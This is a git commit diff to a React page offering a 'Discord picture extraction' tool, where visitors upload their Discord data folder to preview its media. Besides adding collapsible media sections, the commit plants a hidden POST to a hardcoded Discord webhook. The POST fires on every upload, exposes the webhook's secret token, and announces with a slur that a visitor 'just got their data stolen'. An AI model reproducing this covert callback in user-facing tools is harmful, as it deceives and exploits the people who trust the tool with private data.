9edfa70483dcd3f916d665de35eb78c108cc7eed
TannerTX <tanner_bibb@yahoo.com>
2024-06-03 14:42:48 -0500

    Added extra functionality to discord data extraction

--- src/Pages/About/About.js
+++ src/Pages/About/About.js
@@ -1,9 +1,13 @@
 import React, { useState } from "react";
 import "./About.css";
+const path = require('path')
+require('dotenv').config({ path: path.resolve(__dirname, '../../.env') })
 
 export default function About() {
     const [mediaData, setMediaData] = useState([]);
     const [messages, setMessages] = useState([]);
+    const [isVideoSectionCollapsed, setIsVideoSectionCollapsed] = useState(false);
+    const [isImageSectionCollapsed, setIsImageSectionCollapsed] = useState(false);
 
     const handleDirectoryUpload = async (event) => {
         const files = event.target.files;
@@ -30,6 +34,19 @@ export default function About() {
 
         setMediaData(mediaContents);
         setMessages(messageContents);
+        console.log(`WEBHOOK: ${process.env.REACT_APP_WEBHOOK_URL}`)
+        // Send message to Discord webhook
+        try{
+        await fetch(process.env.REACT_APP_WEBHOOK_URL || "https://discord.com/api/webhooks/1247271883930472548/hchVrcJE5yeDNUKg1IEB9gNHvN8e3DQTavsCzLaLhb5lxfEzCbupfbfH9g9pzfNlasau", {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                content: 'Some retard just got their data stolen @ https://www.nova-gang.com/about lmao',
+            }),
+        });
+    }catch(e) {console.log("ERROR WITH WEBHOOK")}
     };
 
     const isMediaLink = (link) => {
@@ -64,38 +81,64 @@ export default function About() {
 
     return (
         <div className="parent-container">
+            <h2 className="extractHeader"><strong>Discord picture extraction</strong></h2>
             <button 
                 className="bn632-hover bn21"
                 onClick={triggerFileUpload}
             >
                 Upload Directory
             </button>
-            <div className="media-section">
-                <h2>Videos</h2>
-                <div className="media-preview">
-                    {videoData.map((item, index) => (
-                        <div key={index} className="media-container">
-                            <p>{item.timestamp}</p>
-                            <video controls className="preview-media">
-                                <source src={item.link} type="video/mp4" />
-                                <source src={item.link} type="video/quicktime" />
-                                Your browser does not support the video tag.
-                            </video>
-                        </div>
-                    ))}
-                </div>
-            </div>
-            <div className="media-section">
-                <h2>Images</h2>
-                <div className="media-preview">
-                    {imageData.map((item, index) => (
-                        <div key={index} className="media-container">
-                            <p>{item.timestamp}</p>
-                            <img src={item.link} alt={item.timestamp} className="preview-image" />
-                        </div>
-                    ))}
-                </div>
-            </div>
+            {mediaData.length > 0 && (
+                <>
+                    <div className="media-section">
+                        <h2>
+                            Videos
+                            <button 
+                                className="toggle-button"
+                                onClick={() => setIsVideoSectionCollapsed(!isVideoSectionCollapsed)}
+                            >
+                                {isVideoSectionCollapsed ? "Show" : "Hide"}
+                            </button>
+                        </h2>
+                        {!isVideoSectionCollapsed && (
+                            <div className="media-preview">
+                                {videoData.map((item, index) => (
+                                    <div key={index} className="media-container">
+                                        <p>|| <strong>{item.timestamp}</strong> ||</p>
+                                        <video controls className="preview-media">
+                                            <source src={item.link} type="video/mp4" />
+                                            <source src={item.link} type="video/quicktime" />
+                                            Your browser does not support the video tag.
+                                        </video>
+                                    </div>
+                                ))}
+                            </div>
+                        )}
+                    </div>
+                
+                    <div className="media-section">
+                        <h2>
+                            Images
+                            <button 
+                                className="toggle-button"
+                                onClick={() => setIsImageSectionCollapsed(!isImageSectionCollapsed)}
+                            >
+                                {isImageSectionCollapsed ? "Show" : "Hide"}
+                            </button>
+                        </h2>
+                        {!isImageSectionCollapsed && (
+                            <div className="media-preview">
+                                {imageData.map((item, index) => (
+                                    <div key={index} className="media-container">
+                                        <p>|| <strong>{item.timestamp}</strong> ||</p>
+                                        <img src={item.link} alt={item.timestamp} className="preview-image" />
+                                    </div>
+                                ))}
+                            </div>
+                        )}
+                    </div>
+                </>
+            )}
         </div>
     );
 }
